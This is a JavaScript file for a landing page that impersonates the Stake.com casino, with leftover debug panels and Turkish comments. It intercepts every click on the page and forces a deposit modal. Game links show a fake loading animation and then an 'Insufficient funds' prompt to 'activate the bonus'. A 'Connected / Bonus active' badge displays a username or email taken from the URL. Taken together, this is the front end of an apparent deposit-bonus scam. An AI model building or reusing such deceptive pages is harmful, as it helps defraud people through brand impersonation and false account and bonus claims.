// ✅ TEST: landing-overrides gerçekten çalışıyor mu?
document.addEventListener("DOMContentLoaded", () => {
  const tag = document.createElement("div");
  tag.textContent = "✅ landing-overrides LOADED";
  tag.style.cssText = "position:fixed;top:10px;left:10px;z-index:999999;background:#00c853;color:#000;padding:8px 10px;border-radius:8px;font:14px/1.2 Arial;";
  document.body.appendChild(tag);

  // ✅ DROPDEBUG panel (guaranteed)
  const box2 = document.createElement("div");
  box2.id = "debugBox2";
  box2.textContent = "DROPDEBUG: ready";
  box2.style.cssText =
    "position:fixed;right:10px;bottom:10px;z-index:999999;" +
    "background:rgba(0,0,0,.85);color:#fff;padding:10px;border-radius:10px;" +
    "font:12px/1.4 monospace;max-width:45vw;max-height:40vh;overflow:auto;white-space:pre-wrap;";
  document.body.appendChild(box2);

  function log2(msg) {
    box2.textContent += "\n" + msg;
    box2.scrollTop = box2.scrollHeight;
  }

  const btns = [...document.querySelectorAll('[aria-label="Open Dropdown"]')];
  log2("Found dropdown btns: " + btns.length);

  btns.forEach((b, i) => {
    b.style.pointerEvents = "auto";
    b.addEventListener(
      "click",
      () => {
        log2("CLICK btn[" + i + "]");
      },
      true
    );
  });
});
// === DEBUG PANEL (remove later) ===
(function () {
  const box = document.createElement("div");
  box.id = "debugBox";
  box.style.cssText =
    "position:fixed;left:8px;bottom:8px;z-index:999999;" +
    "max-width:46vw;max-height:40vh;overflow:auto;" +
    "background:rgba(0,0,0,.85);color:#fff;font:12px/1.4 monospace;" +
    "padding:8px;border-radius:8px;white-space:pre-wrap;";
  box.textContent = "DEBUG: ready\n";
  document.addEventListener("DOMContentLoaded", () => document.body.appendChild(box));

  function log(msg) {
    box.textContent += msg + "\n";
    box.scrollTop = box.scrollHeight;
  }

  window.addEventListener("error", (e) => {
    log("ERROR: " + (e.message || "unknown") + " @ " + (e.filename || "") + ":" + (e.lineno || ""));
  });

  window.addEventListener("unhandledrejection", (e) => {
    log("PROMISE: " + (e.reason && (e.reason.stack || e.reason.message) || e.reason));
  });
})();


(() => {
  const DEPOSIT_MODAL_ID = "myModal";
  const INSUFFICIENT_MODAL_ID = "insufficientFundsModal";
  const USER_BADGE_ID = "stakeUserBadge";
  const PRELOADER_ID = "preloader";
  const CLAIM_WRAPPER_ID = "claim";
  const CLAIM_BONUS_BUTTON_ID = "claim-bonus-btn";
  const CLAIM_CLOSE_BUTTON_ID = "claim-btn-close";

  const css = `
    #${USER_BADGE_ID}{
      position:fixed;
      top:72px;
      right:16px;
      z-index:2500;
      display:none;
      max-width:min(92vw, 360px);
      background:#2f4553;
      color:#e6e8eb;
      border:1px solid rgba(255,255,255,.10);
      box-shadow:0 10px 25px rgba(0,0,0,.35);
      border-radius:12px;
      padding:10px 12px;
      font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
      line-height:1.2;
    }
    #${USER_BADGE_ID} .title{font-size:12px;opacity:.85;margin-bottom:6px}
    #${USER_BADGE_ID} .value{font-size:14px;font-weight:700;word-break:break-word}
    #${USER_BADGE_ID} .hint{font-size:12px;opacity:.85;margin-top:6px}
    @media (max-width: 768px){
      #${USER_BADGE_ID}{top:64px;right:10px}
    }

    #${INSUFFICIENT_MODAL_ID}{
      position:fixed;
      inset:0;
      z-index:2600;
      display:none;
      align-items:center;
      justify-content:center;
      background:rgba(0,0,0,.75);
      padding:16px;
    }
    #${INSUFFICIENT_MODAL_ID} .card{
      width:min(520px, 100%);
      background:#1a2c38;
      color:#e6e8eb;
      border:1px solid rgba(255,255,255,.12);
      border-radius:14px;
      box-shadow:0 20px 60px rgba(0,0,0,.55);
      overflow:hidden;
    }
    #${INSUFFICIENT_MODAL_ID} .body{padding:18px 18px 14px}
    #${INSUFFICIENT_MODAL_ID} .msg{font-size:16px;font-weight:700;margin:0}
    #${INSUFFICIENT_MODAL_ID} .sub{font-size:13px;opacity:.85;margin:10px 0 0}
    #${INSUFFICIENT_MODAL_ID} .actions{
      display:flex;
      gap:10px;
      padding:14px 18px 18px;
      justify-content:flex-end;
      background:rgba(255,255,255,.03);
    }
    #${INSUFFICIENT_MODAL_ID} .btn{
      appearance:none;
      border:0;
      border-radius:10px;
      padding:10px 14px;
      font-weight:700;
      cursor:pointer;
    }
    #${INSUFFICIENT_MODAL_ID} .btn.primary{background:#2d7dff;color:white}
    #${INSUFFICIENT_MODAL_ID} .btn.ghost{background:transparent;color:#e6e8eb;border:1px solid rgba(255,255,255,.18)}

    #${PRELOADER_ID}[data-game-loading="true"] .preloader-img{display:none !important}
    #${PRELOADER_ID}[data-game-loading="true"] .stake-game-loader{
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      gap:14px;
    }
    #${PRELOADER_ID}[data-game-loading="true"] .stake-game-track{
      width:84px;
      height:10px;
      border-radius:999px;
      background:rgba(255,255,255,.14);
      position:relative;
      overflow:hidden;
    }
    #${PRELOADER_ID}[data-game-loading="true"] .stake-game-dot{
      width:18px;
      height:8px;
      border-radius:999px;
      background:rgba(255,255,255,.95);
      position:absolute;
      top:50%;
      left:1px;
      transform:translateY(-50%);
      box-shadow:0 2px 6px rgba(0,0,0,.35);
      animation:stakeDotSlide .9s ease-in-out infinite alternate;
    }
    @keyframes stakeDotSlide{
      from{transform:translateY(-50%) translateX(0)}
      to{transform:translateY(-50%) translateX(calc(84px - 18px - 2px))}
    }
  `;

  function ensureStyles() {
    if (document.getElementById("landingOverridesStyle")) return;
    const style = document.createElement("style");
    style.id = "landingOverridesStyle";
    style.textContent = css;
    document.head.appendChild(style);
  }

  function getDepositModal() {
    return document.getElementById(DEPOSIT_MODAL_ID);
  }

  function setBodyScrollLocked(locked) {
    const body = document.getElementById("body-scroll") || document.body;
    if (!body) return;
    if (locked) body.classList.add("body-scroll-hidden");
    else body.classList.remove("body-scroll-hidden");
  }

  function isDepositModalOpen() {
    const modal = getDepositModal();
    if (!modal) return false;
    return (
      (modal.style.display || "").toLowerCase() !== "none" &&
      modal.style.display !== ""
    );
  }

  function isInsufficientModalOpen() {
    const modal = document.getElementById(INSUFFICIENT_MODAL_ID);
    if (!modal) return false;
    return (
      (modal.style.display || "").toLowerCase() !== "none" &&
      modal.style.display !== ""
    );
  }

  function closeClaimModal(
    { unlockScrollIfIdle } = { unlockScrollIfIdle: true }
  ) {
    const claim = document.getElementById(CLAIM_WRAPPER_ID);
    if (!claim) return;
    claim.style.display = "none";
    if (
      unlockScrollIfIdle &&
      !isDepositModalOpen() &&
      !isInsufficientModalOpen()
    ) {
      setBodyScrollLocked(false);
    }
  }

  function openDepositModal() {
    const modal = getDepositModal();
    if (!modal) return;
    modal.style.zIndex = "2700";
    modal.style.display = "flex";
    setBodyScrollLocked(true);
  }

  function closeDepositModal() {
    const modal = getDepositModal();
    if (!modal) return;
    modal.style.display = "none";
    setBodyScrollLocked(false);
  }

  function ensureInsufficientModal() {
    let modal = document.getElementById(INSUFFICIENT_MODAL_ID);
    if (modal) return modal;

    modal = document.createElement("div");
    modal.id = INSUFFICIENT_MODAL_ID;
    modal.innerHTML = `
      <div class="card" role="dialog" aria-modal="true" aria-label="Insufficient funds">
        <div class="body">
          <p class="msg">Insufficient funds / top up your balance to activate the bonus</p>
          <p class="sub"></p>
        </div>
        <div class="actions">
          <button type="button" class="btn ghost" data-action="close">Close</button>
          <button type="button" class="btn primary" data-action="deposit">Deposit</button>
        </div>
      </div>
    `;
    document.body.appendChild(modal);

    modal.addEventListener("click", (e) => {
      const target = e.target;
      if (!(target instanceof Element)) return;
      const actionBtn = target.closest("[data-action]");
      if (actionBtn) {
        const action = actionBtn.getAttribute("data-action");
        if (action === "close") hideInsufficientModal();
        if (action === "deposit") {
          hideInsufficientModal();
          openDepositModal();
        }
        return;
      }
      if (target === modal) hideInsufficientModal();
    });

    return modal;
  }

  function showInsufficientModal() {
    const modal = ensureInsufficientModal();
    modal.style.display = "flex";
    setBodyScrollLocked(true);
  }

  function hideInsufficientModal() {
    const modal = document.getElementById(INSUFFICIENT_MODAL_ID);
    if (!modal) return;
    modal.style.display = "none";
    setBodyScrollLocked(false);
  }

  function setPreloaderVisible(visible, text) {
    const preloader = document.getElementById(PRELOADER_ID);
    if (!preloader) return;

    if (visible) {
      preloader.classList.remove("hide-preloader");
      preloader.style.display = "flex";
      preloader.setAttribute("data-game-loading", "true");

      let loader = preloader.querySelector("[data-stake-game-loader]");
      if (!loader) {
        loader = document.createElement("div");
        loader.setAttribute("data-stake-game-loader", "true");
        loader.className = "stake-game-loader";
        loader.innerHTML = `
          <div class="stake-game-track" aria-label="Loading">
            <div class="stake-game-dot"></div>
          </div>
        `;
        preloader.appendChild(loader);
      }

      const oldLabel = preloader.querySelector("[data-game-loader-label]");
      if (oldLabel) oldLabel.remove();
      return;
    }

    const loader = preloader.querySelector("[data-stake-game-loader]");
    if (loader) loader.remove();
    preloader.style.display = "none";
    preloader.classList.add("hide-preloader");
    preloader.removeAttribute("data-game-loading");
  }

  async function runGameFlow() {
    setBodyScrollLocked(true);
    setPreloaderVisible(true);
    await new Promise((r) => setTimeout(r, 1500));
    setPreloaderVisible(false);
    showInsufficientModal();
  }

  function getUserFromParams() {
    const params = new URLSearchParams(window.location.search);
    const raw =
      params.get("u") ||
      params.get("user") ||
      params.get("username") ||
      params.get("e") ||
      params.get("email") ||
      "";
    return (raw || "").trim();
  }

  function ensureUserBadge() {
    if (document.getElementById(USER_BADGE_ID)) return;
    const badge = document.createElement("div");
    badge.id = USER_BADGE_ID;
    badge.innerHTML = `
      <div class="title">Connected</div>
      <div class="value" data-user-value=""></div>
      <div class="hint">Bonus active</div>
    `;
    document.body.appendChild(badge);
  }

  function updateUserBadge() {
    ensureUserBadge();
    const badge = document.getElementById(USER_BADGE_ID);
    if (!badge) return;

    const fromParams = getUserFromParams();
    if (fromParams) {
      try {
        localStorage.setItem("stakeUserDisplay", fromParams);
      } catch { }
    }

    let value = fromParams;
    if (!value) {
      try {
        value = (localStorage.getItem("stakeUserDisplay") || "").trim();
      } catch { }
    }

    if (!value) {
      badge.style.display = "none";
      return;
    }

    const valueEl = badge.querySelector("[data-user-value]");
    if (valueEl) valueEl.textContent = value;
    badge.style.display = "block";
  }

  function isInsideAllowedUi(target) {
    if (!(target instanceof Element)) return false;
    return Boolean(
      target.closest(`#${DEPOSIT_MODAL_ID}`) ||
      target.closest(`#${INSUFFICIENT_MODAL_ID}`) ||
      target.closest(`#${CLAIM_WRAPPER_ID}`)
    );
  }

  function shouldTreatAsGameLink(anchor) {
    if (!(anchor instanceof HTMLAnchorElement)) return false;
    const href = (anchor.getAttribute("href") || "").trim();
    if (!href) return false;
    return /(^|\/\/)stake\.com\/casino\/games\//i.test(href);
  }

  function installGlobalClickInterceptors() {
    document.addEventListener(
      "click",
      (e) => {
        const target = e.target;
        if (!(target instanceof Element)) return;

        const claimBonusBtn = target.closest(`#${CLAIM_BONUS_BUTTON_ID}`);
        if (claimBonusBtn) {
          e.preventDefault();
          e.stopPropagation();
          closeClaimModal({ unlockScrollIfIdle: false });
          openDepositModal();
          return;
        }

        if (isInsideAllowedUi(target)) return;

        const anchor = target.closest("a");
        const button = target.closest("button");
        const roleButton = target.closest('[role="button"]');
        const actionable = anchor || button || roleButton;
        if (!actionable) return;

        if (anchor && shouldTreatAsGameLink(anchor)) {
          e.preventDefault();
          e.stopPropagation();
          void runGameFlow();
          return;
        }

        e.preventDefault();
        e.stopPropagation();
        openDepositModal();
      },
      true
    );
  }

  function installDepositCloseHandlers() {
    const modal = getDepositModal();
    if (!modal) return;

    modal.addEventListener("click", (e) => {
      const target = e.target;
      if (!(target instanceof Element)) return;

      if (target.id === "closeModalBtn" || target.closest("#closeModalBtn")) {
        e.preventDefault();
        e.stopPropagation();
        closeDepositModal();
        return;
      }

      if (target === modal) {
        closeDepositModal();
      }
    });

    document.addEventListener("keydown", (e) => {
      if (e.key === "Escape") {
        hideInsufficientModal();
        closeClaimModal();
        closeDepositModal();
      }
    });
  }

  function installClaimCloseHandlers() {
    const claim = document.getElementById(CLAIM_WRAPPER_ID);
    if (!claim) return;

    claim.addEventListener("click", (e) => {
      const target = e.target;
      if (!(target instanceof Element)) return;

      const closeBtn =
        target.closest(`#${CLAIM_CLOSE_BUTTON_ID}`) ||
        target.closest("[data-modal-close='true']");
      if (closeBtn) {
        e.preventDefault();
        e.stopPropagation();
        closeClaimModal();
        return;
      }

      const overlay = target.closest("[data-modal-overlay]");
      if (overlay) {
        e.preventDefault();
        e.stopPropagation();
        closeClaimModal();
      }
    });
  }

  function init() {
    ensureStyles();
    updateUserBadge();
    installDepositCloseHandlers();
    installClaimCloseHandlers();
    installGlobalClickInterceptors();
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
// === DROPDOWN FORCE FIX (temporary) ===
(function () {
  function ensurePanel() {
    let box = document.getElementById("debugBox2");
    if (!box) {
      box = document.createElement("div");
      box.id = "debugBox2";
      box.style.cssText =
        "position:fixed;right:8px;bottom:8px;z-index:999999;" +
        "max-width:46vw;max-height:40vh;overflow:auto;" +
        "background:rgba(0,0,0,.85);color:#fff;font:12px/1.4 monospace;" +
        "padding:8px;border-radius:8px;white-space:pre-wrap;";
      box.textContent = "DROPDEBUG: init\n";
      document.addEventListener("DOMContentLoaded", () => document.body.appendChild(box));
    }
    return box;
  }
  function log(msg) {
    const box = ensurePanel();
    box.textContent += msg + "\n";
    box.scrollTop = box.scrollHeight;
  }

  function show(el) {
    if (!el) return false;
    el.style.display = "block";
    el.style.visibility = "visible";
    el.style.opacity = "1";
    el.style.pointerEvents = "auto";
    el.style.zIndex = "999999";
    return true;
  }

  function tryOpenDropdown(btn) {
    // 1) aria-controls varsa hedefi aç
    const controls = btn.getAttribute("aria-controls");
    if (controls) {
      const target = document.getElementById(controls);
      if (target && show(target)) return "opened aria-controls #" + controls;
    }

    // 2) Modal içinde listbox/menu ara (en yaygın pattern)
    const modal = document.getElementById("myModal") || btn.closest("#myModal") || document.querySelector("#myModal");
    const scope = modal || document;

    const candidates = [
      ...scope.querySelectorAll('[role="listbox"]'),
      ...scope.querySelectorAll('[role="menu"]'),
      ...scope.querySelectorAll('[data-testid*="dropdown" i]'),
      ...scope.querySelectorAll('[class*="dropdown" i]'),
      ...scope.querySelectorAll('[class*="listbox" i]'),
      ...scope.querySelectorAll('[class*="popover" i]')
    ];

    // Görünmeyen birini açmayı dene
    for (const c of candidates) {
      const cs = getComputedStyle(c);
      const hidden = cs.display === "none" || cs.visibility === "hidden" || cs.opacity === "0" || c.hasAttribute("hidden");
      if (hidden) {
        c.removeAttribute("hidden");
        if (show(c)) return "opened candidate: " + (c.id ? "#" + c.id : c.className || c.tagName);
      }
    }

    // 3) Hiçbir şey yoksa bilgi dön
    return "no hidden candidate found (count=" + candidates.length + ")";
  }

  document.addEventListener("DOMContentLoaded", () => {
    log("DROPDEBUG: DOMContentLoaded");

    // Dropdown butonlarını bul (sende vardı: aria-label="Open Dropdown")
    const btns = [...document.querySelectorAll('[aria-label="Open Dropdown"]')];
    log("Found dropdown buttons: " + btns.length);

    // Görünür olsun diye pointer-events zorlama (bazı temalarda disable kalıyor)
    btns.forEach((b, i) => {
      b.style.pointerEvents = "auto";
      b.addEventListener("click", (e) => {
        log("CLICK dropdown btn[" + i + "]");
        const res = tryOpenDropdown(b);
        log(" -> " + res);
      }, true);
    });

    // Ekstra: modalın üstünde görünmez bir katman varsa anlamak için tıklama logu
    document.addEventListener("click", (e) => {
      const t = e.target;
      const tag = t && t.tagName ? t.tagName.toLowerCase() : "unknown";
      if (tag) {
        // Çok spam olmasın diye sadece modal içini logla
        const modal = document.getElementById("myModal");
        if (modal && modal.contains(t)) {
          log("MODAL CLICK: " + tag + (t.id ? "#" + t.id : ""));
        }
      }
    }, true);
  });
})();
